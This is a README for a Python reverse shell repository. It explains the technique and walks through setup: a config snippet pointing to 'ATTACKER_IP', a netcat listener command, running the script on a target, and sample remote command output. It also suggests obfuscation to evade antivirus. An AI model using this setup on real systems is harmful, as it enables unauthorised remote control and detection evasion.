# Python Reverse Shell

This is a simple Python reverse shell script that connects back to a remote attacker machine. It can be used for educational purposes to understand how reverse shells work.

## ⚠️ Disclaimer

This project is intended for educational and research purposes only. Do not use this on any network or device without proper authorization. Unauthorized access to computers and networks is illegal and unethical.

## Features

- Reverse shell connection over TCP
- Ability to execute shell commands on the remote machine
- Simple to set up and run
- Easily customizable for different IPs/ports

## How it Works

A **reverse shell** is a connection initiated by a target machine to the attacker's machine. Once the connection is established, the attacker can execute shell commands on the target system.

### Flow:
1. The attacker listens for incoming connections on a specific IP and port.
2. The target machine runs the reverse shell script, which connects back to the attacker’s machine.
3. Once the connection is established, the attacker can execute commands remotely on the target.

## Prerequisites

- Python 3.x installed on the target machine.
- The attacker must be able to listen on a specific IP and port, so make sure any firewalls or NAT settings allow the connection.

## Usage

### 1. Clone the Repository

```bash
git clone https://github.com/your-username/reverse-shell.git
cd reverse-shell
```

### 2. Modify the Reverse Shell Script

Edit the reverse shell Python script (`reverse_shell.py`) to match your attacker's IP and port.

```python
# reverse_shell.py
host = "ATTACKER_IP"  # Change this to your attacker's IP
port = 9999           # Change this to your attacker's port
```

### 3. Set up the Listener (on the Attacker's Machine)

On the attacker's machine, set up a listener using **netcat** or a similar tool to listen for incoming connections.

```bash
nc -lvp 9999
```

### 4. Run the Reverse Shell Script (on the Target Machine)

Once the listener is ready, run the reverse shell script on the target machine:

```bash
python3 reverse_shell.py
```

### 5. Interact with the Target System

Once the connection is established, you’ll be able to execute commands on the target machine from the attacker's terminal.

## Sample Output

On the attacker's machine:

```
listening on [any] 9999 ...
connect to [ATTACKER_IP] from [TARGET_IP] 12345
$ whoami
target_user
$ pwd
/home/target_user
```

## Customization

You can modify the following parts of the script to suit your needs:

- **IP and Port**: Change the target IP and port for the reverse connection.
- **Command Execution**: Customize the behavior of command execution as needed.

## Security Considerations

- **Encryption**: This basic script does not encrypt traffic. For a more secure reverse shell, consider wrapping the connection in SSL/TLS.
- **Detection**: Basic reverse shells like this can be easily detected by antivirus software. Obfuscation techniques or custom protocols may be necessary for advanced usage.

## Legal Disclaimer

This project is for **educational purposes** only and is not meant to be used maliciously. The author of this repository is **not responsible** for any misuse or damage caused by this tool. Use responsibly and always obtain permission before using it on any system or network.

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## Contributing

If you'd like to contribute, feel free to open an issue or submit a pull request!

---

By using this repository, you agree to use it responsibly and ethically.

